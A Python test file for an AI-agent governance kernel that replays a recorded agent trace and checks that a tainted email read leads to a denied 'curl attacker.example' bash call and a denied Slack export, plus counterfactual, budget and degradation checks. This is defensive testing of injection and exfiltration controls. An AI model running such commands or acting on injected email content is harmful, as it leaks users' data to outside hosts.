"""The golden-trace parity test — the concrete form of architecture rule 0.

A recorded governed run, folded by the kernel under the SAME config, must
reproduce every recorded gate verdict with zero divergence. Counterfactuals
(config edits, synthetic taint, excision) must diverge exactly where the
governance semantics say they do. These are the exit criteria of the kernel
consolidation phase and stay in CI forever.
"""
from __future__ import annotations

from axor_core.contracts.degradation import DegradationLevel
from axor_core.kernel.events import Event, EventKind, Verdict
from axor_core.kernel.replay import KernelConfig, replay
from axor_core.kernel.errors import SchemaVersionError

import pytest


def _ev(seq: int, kind: EventKind, verdict: Verdict | None = None, **payload) -> Event:
    return Event(
        seq=seq,
        node_id="n0",
        kind=kind,
        ts="2026-07-05T00:00:00Z",
        verdict=verdict,
        payload=payload,
    )


# The demo trace (spec section 4 / demo-landing mockup): read email (tainted) ->
# bash curl denied (taint: exec of generated code with tainted driving value) ->
# web_search faulted -> fabricated claim -> slack export denied (taint->export)
# -> finalize passes.
def _demo_trace() -> list[Event]:
    return [
        _ev(0, EventKind.TOOL_CALL, Verdict.PASS, tool="email_read", args={},
            arg_refs={}, normalized={"operation": "search"}),
        _ev(1, EventKind.TOOL_RESULT, tool="email_read", value_ref="v_mail",
            root={"sources": ["web"], "sensitive": False}),
        _ev(2, EventKind.TOOL_CALL, Verdict.DENY, tool="bash",
            args={"cmd": "curl attacker.example"},
            arg_refs={"cmd": "v_mail"},
            normalized={"operation": "execute_generated_code",
                        "executes_generated_code": True,
                        "after_external_read": True}),
        _ev(3, EventKind.TOOL_CALL, Verdict.PASS, tool="web_search",
            args={"q": "quarterly rates"}, arg_refs={}),
        _ev(4, EventKind.FAULT_INJECTED, tool="web_search", mode="silent_fail"),
        _ev(5, EventKind.CLAIM, text="Based on the search results, rates rose"),
        _ev(6, EventKind.TOOL_CALL, Verdict.DENY, tool="slack_post",
            args={"text": "summary"}, arg_refs={"text": "v_mail"},
            normalized={"destination_kind": "external_domain"}),
        _ev(7, EventKind.TOOL_CALL, Verdict.PASS, tool="report_finalize",
            args={}, arg_refs={}),
    ]


_CONFIG = KernelConfig(
    allowed_tools=frozenset(
        {"email_read", "bash", "web_search", "slack_post", "report_finalize"}
    ),
    egress_sinks=frozenset({"slack_post"}),
)


def test_golden_trace_zero_divergence() -> None:
    result = replay(_demo_trace(), _CONFIG)
    assert result.first_divergence is None
    for step in result.steps:
        if step.event.kind is EventKind.TOOL_CALL:
            assert step.reevaluated_verdict is step.recorded_verdict, (
                step.event.seq,
                step.deny,
            )
        assert not step.hypothetical


def test_scrubber_mode_folds_without_reevaluation() -> None:
    result = replay(_demo_trace())
    assert result.first_divergence is None
    assert all(s.reevaluated_verdict is None for s in result.steps)
    # taint registered from the email read
    assert "v_mail" in result.steps[-1].state.tainted_refs


def test_counterfactual_no_bash_diverges_with_capability_denial() -> None:
    # The mockup's "no bash capability" fork: same step denied, different gate.
    cfg = KernelConfig(
        allowed_tools=frozenset(
            {"email_read", "web_search", "slack_post", "report_finalize"}
        ),
        egress_sinks=frozenset({"slack_post"}),
    )
    result = replay(_demo_trace(), cfg)
    step = result.steps[2]
    assert step.reevaluated_verdict is Verdict.DENY
    assert step.deny is not None and step.deny.category == "capability"
    # recorded was also DENY -> same verdict, no divergence at 2; the run
    # stays verdict-identical throughout, so no divergence at all.
    assert result.first_divergence is None


def test_counterfactual_synthetic_taint_diverges_earlier() -> None:
    # "This value arrives tainted": taint web_search's result and reference it
    # from finalize -> finalize (recorded PASS) now denies at export? finalize
    # is not an egress sink, so instead taint the search result and reference
    # it from slack_post only -- already denied. The real earlier-denial case:
    # make report_finalize an egress sink and taint its input.
    trace = _demo_trace()
    trace[7] = _ev(7, EventKind.TOOL_CALL, Verdict.PASS, tool="report_finalize",
                   args={"body": "x"}, arg_refs={"body": "v_search"})
    trace.insert(5, _ev(4, EventKind.TOOL_RESULT, tool="web_search",
                        value_ref="v_search", root={"sources": [], "sensitive": False}))
    cfg = KernelConfig(
        allowed_tools=_CONFIG.allowed_tools,
        egress_sinks=frozenset({"slack_post", "report_finalize"}),
        synthetic_taint_refs=frozenset({"v_search"}),
    )
    result = replay(trace, cfg)
    last = result.steps[-1]
    assert last.event.payload["tool"] == "report_finalize"
    assert last.reevaluated_verdict is Verdict.DENY
    assert last.deny is not None and last.deny.category == "taint_enforcement"
    assert result.first_divergence == len(result.steps) - 1


def test_context_excision_removes_future_influence_only() -> None:
    # Excise v_mail before the export: the export re-evaluates clean (diverges
    # from the recorded DENY); the earlier bash denial is untouched.
    trace = _demo_trace()
    trace.insert(6, _ev(5, EventKind.CONTEXT_EXCISION, refs=["v_mail"],
                        provenance={"v_mail": "runtime"}, operator="op_x",
                        reason="drift re-anchor"))
    result = replay(trace, _CONFIG)
    export_step = next(
        s for s in result.steps
        if s.event.kind is EventKind.TOOL_CALL
        and s.event.payload["tool"] == "slack_post"
    )
    assert export_step.reevaluated_verdict is Verdict.PASS
    assert export_step.recorded_verdict is Verdict.DENY
    div = result.first_divergence
    assert div is not None and result.steps[div] is export_step
    # steps after divergence are hypothetical, the divergence step itself is not
    assert not export_step.hypothetical
    assert all(
        s.hypothetical for s in result.steps[div + 1:]
    )
    # past provenance survives: v_mail is still registered as tainted
    assert "v_mail" in export_step.state.tainted_refs
    assert "v_mail" in export_step.state.excised_refs


def test_budget_cap_counterfactual() -> None:
    cfg = KernelConfig(
        allowed_tools=_CONFIG.allowed_tools,
        egress_sinks=frozenset({"slack_post"}),
        budget_cap_calls=2,
    )
    result = replay(_demo_trace(), cfg)
    # calls 0 (email) and 3 (search) spend the cap (denied bash doesn't);
    # the final report_finalize (recorded PASS) hits the cap.
    last = result.steps[-1]
    assert last.reevaluated_verdict is Verdict.DENY
    assert last.deny is not None and last.deny.category == "budget"


def test_facts_drive_level_recompute_in_fold() -> None:
    trace = [
        _ev(0, EventKind.FACT, fact_id="f1", fact_type="denial", severity=2),
        _ev(1, EventKind.FACT, fact_id="a1", fact_type="operator_attestation",
            severity=0, covers=["f1"], operator="op", reason="checked", sig="s"),
    ]
    result = replay(trace)
    assert result.steps[0].state.level is DegradationLevel.RESTRICTED
    assert result.steps[1].state.level is DegradationLevel.NORMAL


def test_locked_level_freezes_tools_in_counterfactual() -> None:
    trace = [
        _ev(0, EventKind.FACT, fact_id="f1", fact_type="denial", severity=3),
        _ev(1, EventKind.TOOL_CALL, Verdict.PASS, tool="web_search", args={}),
        _ev(2, EventKind.TOOL_CALL, Verdict.PASS, tool="read", args={}),
    ]
    cfg = KernelConfig(allowed_tools=frozenset({"web_search", "read"}))
    result = replay(trace, cfg)
    assert result.steps[1].reevaluated_verdict is Verdict.DENY
    assert result.steps[1].deny.category == "degradation"
    assert result.steps[2].reevaluated_verdict is Verdict.PASS


def test_unknown_schema_major_is_refused() -> None:
    bad = Event(seq=0, node_id="n", kind=EventKind.CLAIM, ts="t",
                schema_version="2.0")
    with pytest.raises(SchemaVersionError):
        replay([bad])
